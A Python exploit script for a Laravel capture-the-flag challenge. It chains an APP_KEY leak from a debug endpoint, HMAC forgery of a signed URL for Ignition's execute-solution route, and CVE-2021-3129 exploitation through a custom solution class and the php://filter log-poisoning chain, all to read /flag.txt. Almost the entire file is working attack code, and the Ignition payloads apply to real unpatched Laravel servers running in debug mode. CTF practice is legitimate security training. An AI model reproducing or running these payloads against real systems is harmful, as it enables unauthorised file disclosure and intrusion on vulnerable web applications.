#!/usr/bin/env python3
"""
Complete Exploit: Shadow Protocol - CVE-2021-3129 + Signed URL Chain  
Target: Laravel CTF Challenge

Attack Chain:
1. Leak APP_KEY via debug mode
2. Forge signed URL for /_ignition/execute-solution
3. Exploit CVE-2021-3129 to read /flag.txt
4. Extract flag from response

Usage: python3 exploit_complete.py <target_url>
Example: python3 exploit_complete.py http://localhost:5050
"""

import sys
import re
import hmac
import hashlib
import time
import json
import base64
import requests

requests.packages.urllib3.disable_warnings()


class CTFExploit:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.verify = False
        self.app_key = None

    def banner(self):
        print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                               â•‘
â•‘   Shadow Protocol: CVE-2021-3129 + Signed URL Chain          â•‘
â•‘   Laravel CTF Challenge Exploit                               â•‘
â•‘                                                               â•‘
â•‘   [1] Leak APP_KEY from debug page                           â•‘
â•‘   [2] Forge signed URL with HMAC-SHA256                      â•‘
â•‘   [3] Exploit CVE-2021-3129 (Ignition RCE)                   â•‘
â•‘   [4] Read /flag.txt from response                           â•‘
â•‘                                                               â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)

    def log(self, level: str, msg: str):
        colors = {
            'info': '\033[94m[*]\033[0m',
            'success': '\033[92m[+]\033[0m',
            'error': '\033[91m[-]\033[0m',
            'warning': '\033[93m[!]\033[0m',
        }
        prefix = colors.get(level, '[?]')
        print(f"{prefix} {msg}")

    def leak_app_key(self) -> bool:
        """Step 1: Leak APP_KEY from debug page"""
        self.log('info', "Leaking APP_KEY via debug page...")
        
        try:
            r = self.session.get(
                f"{self.target}/api/node/status",
                params={'node_id': 'kj'},
                timeout=10
            )
            
            # Look for base64 key in response (appears in error context)
            match = re.search(r'key=([^,\s}]+)', r.text)
            if match:
                self.app_key = match.group(1).strip()
                self.log('success', f"Key leaked: {self.app_key}")
                return True
            
            # Fallback: look for any base64 string
            match = re.search(r'(base64:[A-Za-z0-9+/=]+)', r.text, re.IGNORECASE)
            if match:
                self.app_key = match.group(1).strip()
                self.log('success', f"Key leaked: {self.app_key}")
                return True
        except:
            pass
        
        return False

    def exploit_ignition(self) -> str:
        """Step 2 & 3: Forge signature and exploit CVE-2021-3129"""
        self.log('info', "Forging signed URL for Ignition...")
        
        expires = int(time.time()) + 300
        url_to_sign = f"{self.target}/_ignition/execute-solution?expires={expires}"
        
        signature = hmac.new(
            self.app_key.encode('utf-8'),
            url_to_sign.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        
        signed_url = f"{url_to_sign}&signature={signature}"
        
        self.log('success', "Signed URL forged")
        self.log('info', f"Exploiting CVE-2021-3129 to read /flag.txt...")
        
        # Method 1: Try custom ReadFileSolution
        payload1 = {
            "solution": "App\\Solutions\\ReadFileSolution",
            "parameters": {
                "variableName": "flag",
                "filePath": "/flag.txt"
            }
        }
        
        try:
            r = self.session.post(
                signed_url,
                json=payload1,
                headers={'Content-Type': 'application/json'},
                timeout=15
            )
            
            if r.status_code == 200 and r.text:
                self.log('success', "CVE-2021-3129 exploited (custom solution)!")
                return r.text
        except:
            pass
        
        # Method 2: Try standard MakeViewVariableOptionalSolution with log poisoning
        self.log('info', "Trying log poisoning method...")
        
        # Clear logs
        clear_filter = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        payload_clear = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "x",
                "viewFile": clear_filter
            }
        }
        self.session.post(signed_url, json=payload_clear, timeout=10)
        
        # Write flag content to logs using base64 encoding
        flag_filter = "php://filter/read=convert.base64-encode/resource=/flag.txt"
        payload_poison = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "x",
                "viewFile": flag_filter
            }
        }
        self.session.post(signed_url, json=payload_poison, timeout=10)
        
        # Read the logs
        payload_read = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "x",
                "viewFile": "../storage/logs/laravel.log"
            }
        }
        
        try:
            r = self.session.post(
                signed_url,
                json=payload_read,
                headers={'Content-Type': 'application/json'},
                timeout=15
            )
            
            if r.status_code in [200, 500]:
                self.log('success', "CVE-2021-3129 exploited (log poisoning)!")
                return r.text
        except Exception as e:
            self.log('warning', f"Log poisoning failed: {e}")
        
        return ""

    def extract_flag(self, content: str) -> str:
        """Extract FLAG from response"""
        # Direct JSON response
        try:
            data = json.loads(content)
            if 'content' in data:
                flag = re.search(r'(?:FLAG|BUETCTF)\{[^}]+\}', data['content'], re.IGNORECASE)
                if flag:
                    return flag.group(0)
            if 'base64' in data:
                decoded = base64.b64decode(data['base64']).decode('utf-8', errors='ignore')
                flag = re.search(r'(?:FLAG|BUETCTF)\{[^}]+\}', decoded, re.IGNORECASE)
                if flag:
                    return flag.group(0)
        except:
            pass
        
        # Direct match in HTML/text
        flag_match = re.search(r'(?:FLAG|BUETCTF)\{[^}]+\}', content, re.IGNORECASE)
        if flag_match:
            return flag_match.group(0)
        
        # Base64 encoded in logs or response
        b64_patterns = [
            r'"originalContents"[^"]*"([A-Za-z0-9+/]{40,}={0,2})"',
            r'>([A-Za-z0-9+/]{40,}={0,2})<',
            r'\[([A-Za-z0-9+/]{40,}={0,2})\]',
        ]
        
        for pattern in b64_patterns:
            matches = re.findall(pattern, content)
            for match in matches:
                try:
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    flag = re.search(r'(?:FLAG|BUETCTF)\{[^}]+\}', decoded, re.IGNORECASE)
                    if flag:
                        return flag.group(0)
                except:
                    continue
        
        return ""

    def run(self) -> bool:
        """Execute the complete exploit chain"""
        self.banner()
        
        print("\n" + "="*65)
        print("PHASE 1: APP_KEY LEAK")
        print("="*65 + "\n")
        
        if not self.leak_app_key():
            self.log('error', "Failed to leak APP_KEY")
            return False
        
        print("\n" + "="*65)
        print("PHASE 2-3: SIGNATURE FORGERY + CVE-2021-3129")
        print("="*65 + "\n")
        
        response = self.exploit_ignition()
        
        if not response:
            self.log('error', "CVE-2021-3129 exploitation failed")
            return False
        
        print("\n" + "="*65)
        print("PHASE 4: FLAG EXTRACTION")
        print("="*65 + "\n")
        
        flag = self.extract_flag(response)
        
        if flag:
            print("\n" + "="*65)
            print("SUCCESS!")
            print("="*65)
            print(f"\nðŸš©  {flag}\n")
            print("="*65 + "\n")
            return True
        else:
            self.log('warning', "Flag not found in response")
            self.log('info', "Response preview:")
            print(response[:500])
            return False


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"\nExample:")
        print(f"  {sys.argv[0]} http://localhost:5050")
        sys.exit(1)
    
    target = sys.argv[1]
    exploit = CTFExploit(target)
    
    try:
        success = exploit.run()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n\n[!] Exploit interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
